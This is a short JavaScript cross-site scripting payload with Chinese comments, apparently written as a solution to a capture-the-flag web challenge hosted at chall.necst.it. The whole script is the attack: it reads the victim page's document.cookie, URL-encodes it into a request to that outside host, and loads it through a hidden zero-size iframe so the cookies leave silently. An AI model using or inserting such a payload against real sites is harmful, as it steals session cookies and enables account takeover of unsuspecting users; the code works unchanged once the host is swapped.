(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "https://chall.necst.it/challenges/web3/verify/411/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);